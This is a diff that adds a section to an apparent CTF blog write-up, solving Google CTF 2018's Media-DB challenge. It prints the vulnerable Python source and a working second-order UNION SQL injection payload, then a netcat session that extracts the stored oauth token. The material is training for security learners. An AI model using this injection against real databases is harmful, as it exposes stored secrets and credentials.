@@ -2061,6 +2061,8 @@ I_g0T_m4d_sk1lLz
 zLl1ks_d4m_T0g_I 
 ```
 
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/92.png" alt="" class="center">
+
 It looks like our password is being compared to a reversed version of itself. Let's try using the reversed password instead.
 
 ```bash
@@ -2081,3 +2083,188 @@ CTF{I_g0T_m4d_sk1lLz}
 <br>
 ### Solution
 <b>CTF{I_g0T_m4d_sk1lLz}</b>
+
+
+
+<br>
+<br>
+## Media-DB - misc
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/93.png" alt="" class="center">
+<br>
+<br>
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/94.png" alt="" class="center">
+
+This challenge prompt mentions that there might be an oauth token to steal. Downloading and unzipping the attachment reveals a file called <b>media-db.py</b>. If we connect to the server using netcat, we are presumably interacting with the source file below.
+
+<b>media-db.py</b>
+```py
+#!/usr/bin/env python2.7
+
+import sqlite3
+import random
+import sys
+
+BANNER = "=== Media DB ==="
+MENU = """\
+1) add song
+2) play artist
+3) play song
+4) shuffle artist
+5) exit"""
+
+with open('oauth_token') as fd:
+  flag = fd.read()
+
+conn = sqlite3.connect(':memory:')
+c = conn.cursor()
+
+c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
+c.execute("CREATE TABLE media (artist text, song text)")
+c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))
+
+def my_print(s):
+  sys.stdout.write(s + '\n')
+  sys.stdout.flush()
+
+def print_playlist(query):
+  my_print("")
+  my_print("== new playlist ==")
+  for i, res in enumerate(c.execute(query).fetchall()):
+    my_print('{}: "{}" by "{}"'.format(i+1, res[1], res[0]))
+  my_print("")
+
+my_print(BANNER)
+
+while True:
+  my_print(MENU)
+  sys.stdout.write("> ")
+  sys.stdout.flush()
+  choice = raw_input()
+  if choice not in ['1', '2', '3', '4', '5']:
+    my_print('invalid input')
+    continue
+  if choice == '1':
+    my_print("artist name?")
+    artist = raw_input().replace('"', "")
+    my_print("song name?")
+    song = raw_input().replace('"', "")
+    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
+  elif choice == '2':
+    my_print("artist name?")
+    artist = raw_input().replace("'", "")
+    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
+  elif choice == '3':
+    my_print("song name?")
+    song = raw_input().replace("'", "")
+    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
+  elif choice == '4':
+    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
+    my_print("choosing songs from random artist: {}".format(artist))
+    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
+  else:
+    my_print("bye")
+    exit(0)
+```
+
+Menu choice 1 allows us to add an artist and song name into the <b>media</b> table as one single entry of two comma-separated values. It will attempt to assign the artist and song variables using two different input prompts. We might also notice that double quotes are being replaced with empty strings to prevent SQL injection. There is no attempt to replace single quotes, however.
+
+```py
+if choice == '1':
+    my_print("artist name?")
+    artist = raw_input().replace('"', "")
+    my_print("song name?")
+    song = raw_input().replace('"', "")
+    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
+```
+
+Choices 2 and 3 allow us to query an artist or song separately while replacing single quotes with empty strings. Any attempt here at single quote SQL injection through the artist and song variables would be fruitless.
+
+```py
+elif choice == '2':
+    my_print("artist name?")
+    artist = raw_input().replace("'", "")
+    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
+elif choice == '3':
+    my_print("song name?")
+    song = raw_input().replace("'", "")
+    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
+```
+
+Taking a careful look at choice 4 reveals a glaring difference compared to the other menu choices. There is no attempt at quote replacement here. Choice 4 queries a random entry from the <b>media</b> table which we can insert values into via choice 1. Since the string formatter is contained within single quotes, single quote injection (which if we if we recall from choice 1 is not being prevented) is theoretically possible.
+
+```py
+elif choice == '4':
+    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
+    my_print("choosing songs from random artist: {}".format(artist))
+    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
+```
+
+From the line below, we know that we want to query an entry from the <b>oauth_token</b> table. Since a query to this table is not programmed into the source code, we'll have to take advantage of a single quote injection and UNION selection injection via menu choice 1.
+
+```py
+c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))
+```
+
+Let's see how this can be done. Below is the query we will be manipulating from choice 4.
+
+```py
+"SELECT artist, song FROM media WHERE artist = '{}'"
+```
+
+If inside the brackets, we have the following code (on the second line), then the entire query will look like what we have at the bottom.
+
+```py
+# our input to menu choice 1, "artist name?"
+' AND 1=2 UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE '1'='1
+
+
+# menu choice 4 will perform the query:
+"SELECT artist, song FROM media WHERE artist = ' ' AND 1=2 UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE '1'='1 '"
+```
+
+After performing the SQL injection in menu choice 1, selecting menu choice 4 will perform the desired query. It will attempt to select an <code>artist = ' ' AND 1=2</code> which evaluates to false and returns no entries. The blank query will be UNION'ed with <code>UNION SELECT oauth_token</code>. The rest of this query is separated by <code>,1</code> which is necessary for choice 1 as it stores both an artist and a song. The rest of the query <code>FROM oauth_tokens WHERE '1'='1</code> selects all entries from the oauth_tokens table. Note, menu choice 1 will also ask us for the song name, which we will have already taken care of from our input to the artist name. Thus, we can insert any value here.
+
+Let's put our injection to the test.
+
+```bash
+root@kali:~# nc media-db.ctfcompetition.com 1337
+=== Media DB ===
+1) add song
+2) play artist
+3) play song
+4) shuffle artist
+5) exit
+> 1                                                                       
+artist name?
+' AND 1=2 UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE '1'='1
+song name?
+1
+1) add song
+2) play artist
+3) play song
+4) shuffle artist
+5) exit
+> 4
+choosing songs from random artist: ' AND 1=2 UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE '1'='1
+
+== new playlist ==
+1: "1" by "CTF{fridge_cast_oauth_token_cahn4Quo}
+"
+
+1) add song
+2) play artist
+3) play song
+4) shuffle artist
+5) exit
+```
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/95.png" alt="" class="center">
+
+Our SQL injection is successful, and we are able to retrieve the flag.
+
+
+<br>
+<br>
+### Solution
+<b>CTF{fridge_cast_oauth_token_cahn4Quo}</b>
